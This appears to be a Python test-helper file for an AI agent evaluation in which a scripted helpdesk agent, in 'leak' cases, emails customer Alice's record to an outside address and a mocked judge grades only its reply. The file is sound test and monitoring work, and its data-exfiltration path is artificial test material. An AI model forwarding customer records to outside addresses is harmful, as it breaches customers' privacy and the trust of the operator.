# SPDX-License-Identifier: Apache-2.0
"""Test helpers for the reply-only grader: per-case helpdesk runs and a scripted grader."""

import re
from collections.abc import Callable, Mapping, Sequence
from dataclasses import dataclass
from pathlib import Path

# task_with's `scorer` parameter is typed via the optional inspect_scout package (not installed).
from inspect_ai import (
    Task,
    task_with,  # pyright: ignore[reportUnknownVariableType]
)
from inspect_ai.dataset import MemoryDataset
from inspect_ai.event import ModelEvent
from inspect_ai.log import EvalSample, resolve_sample_attachments
from inspect_ai.model import (
    ChatMessage,
    ChatMessageAssistant,
    ChatMessageTool,
    GenerateConfig,
    Model,
    ModelOutput,
    get_model,
)
from inspect_ai.tool import ToolChoice, ToolInfo

from probo.judges import JUDGE_ROLE, reply_only_judge
from probo.scenarios.helpdesk_exfil.data import ALICE_EMAIL, ALICE_ID
from probo.scenarios.helpdesk_exfil.dataset import NoteOverride, build_sample
from probo.scenarios.helpdesk_exfil.task import helpdesk_exfil
from probo.scenarios.helpdesk_exfil.user_tasks import REPLY_ORDER_STATUS

from ..scenarios.helpdesk_support import (
    ALICE_REPLY,
    MOCK_MODEL,
    Call,
    Step,
    email,
)

SEED = 11
OUTSIDE = "records@outside.test"
"""Where a leaking case forwards Alice's record."""
REQUEST = REPLY_ORDER_STATUS.prompt
"""The user request of every case sample."""
_CASE_NOTE = re.compile(r"Judge case ([a-z0-9-]+)\.")

Reply = str | Callable[[Sequence[ChatMessage]], str]
"""The final reply, or a function of the conversation that returns it."""


@dataclass(frozen=True)
class Case:
    """One sample of the reply-order-status task: whether the agent leaks, and what it says.

    The sample id is `reply-order-status/<variant>`; the ticket note names the variant, so
    the scripted agent can tell its case from the `read_ticket` result.
    """

    variant: str
    leak: bool
    reply: Reply

    @property
    def sample_id(self) -> str:
        return f"{REPLY_ORDER_STATUS.id}/{self.variant}"


def tool_texts(messages: Sequence[ChatMessage]) -> list[str]:
    return [m.text for m in messages if isinstance(m, ChatMessageTool)]


def case_agent(cases: Sequence[Case], calls: list[int] | None = None) -> Model:
    """A scripted agent: read the ticket, look up Alice, then either forward her record to
    `OUTSIDE` or reply to her, and submit the case's reply.

    Unlike `helpdesk_support.scripted_agent`, its tool calls carry no assistant text, so the
    final reply (`state.output.completion`) is exactly the submitted answer and can be
    empty. The step number of each generate is appended to `calls` when given.
    """
    by_variant = {case.variant: case for case in cases}

    def case_of(messages: Sequence[ChatMessage]) -> Case:
        for text in tool_texts(messages):
            match = _CASE_NOTE.search(text)
            if match is not None:
                return by_variant[match[1]]
        raise AssertionError("no case note in the conversation")

    def send(messages: Sequence[ChatMessage]) -> Call:
        if case_of(messages).leak:
            return email(OUTSIDE, tool_texts(messages)[-1], "Customer record")
        return email(ALICE_EMAIL, ALICE_REPLY)

    def submit(messages: Sequence[ChatMessage]) -> Call:
        reply = case_of(messages).reply
        return ("submit", {"answer": reply if isinstance(reply, str) else reply(messages)})

    steps: list[Step] = [
        ("read_ticket", {"ticket_id": REPLY_ORDER_STATUS.ticket_id}),
        ("get_customer", {"customer_id": ALICE_ID}),
        send,
        submit,
    ]

    def output(
        messages: list[ChatMessage],
        tools: list[ToolInfo],
        tool_choice: ToolChoice,
        config: GenerateConfig,
    ) -> ModelOutput:
        step = sum(isinstance(m, ChatMessageAssistant) for m in messages)
        if calls is not None:
            calls.append(step)
        if step >= len(steps):
            raise AssertionError("the agent was asked to continue after submitting")
        current = steps[step]
        name, arguments = current(messages) if callable(current) else current
        return ModelOutput.for_tool_call(MOCK_MODEL, name, arguments, content="")

    return get_model(MOCK_MODEL, custom_outputs=output)


def case_task(cases: Sequence[Case], empty_corpus: Path, judge: bool = True) -> Task:
    """The helpdesk task with one sample per case, and `reply_only_judge` after its checks
    unless `judge` is false."""
    empty_corpus.mkdir(parents=True, exist_ok=True)
    base = helpdesk_exfil(seed=SEED, watch_address=None, corpus_dir=str(empty_corpus))
    dataset = MemoryDataset(
        [
            build_sample(
                REPLY_ORDER_STATUS,
                SEED,
                NoteOverride(variant=case.variant, text=f"Judge case {case.variant}."),
            )
            for case in cases
        ]
    )
    scorers = [*(base.scorer or []), *([reply_only_judge()] if judge else [])]
    return task_with(base, dataset=dataset, scorer=scorers)


GraderRule = Callable[[str], str]
"""Maps the grader prompt to the grader's completion (or raises, as a failing API would)."""


def grader(rule: GraderRule | Mapping[str, str], calls: list[str] | None = None) -> Model:
    """A mockllm grader. A mapping gives the completion for the first key found in the
    prompt (a tag in the reply); a key with no match raises `AssertionError`."""

    def by_tag(prompt: str) -> str:
        assert not callable(rule)
        for tag, completion in rule.items():
            if tag in prompt:
                return completion
        raise AssertionError(f"no grader rule for prompt {prompt!r}")

    respond = rule if callable(rule) else by_tag

    def output(
        messages: list[ChatMessage],
        tools: list[ToolInfo],
        tool_choice: ToolChoice,
        config: GenerateConfig,
    ) -> ModelOutput:
        prompt = messages[-1].text
        if calls is not None:
            calls.append(prompt)
        return ModelOutput.from_content(MOCK_MODEL, respond(prompt))

    return get_model(MOCK_MODEL, custom_outputs=output)


def grader_events(sample: EvalSample) -> list[ModelEvent]:
    """The sample's model events on the `judge` role, with attachments resolved."""
    events = resolve_sample_attachments(sample, "full").events
    return [e for e in events if isinstance(e, ModelEvent) and e.role == JUDGE_ROLE]


def boundary_of(prompt: str) -> str:
    """The boundary marker of a rendered grader prompt."""
    match = re.search(r"^BEGIN REQUEST (\S+)$", prompt, re.MULTILINE)
    assert match is not None, prompt
    return match[1]
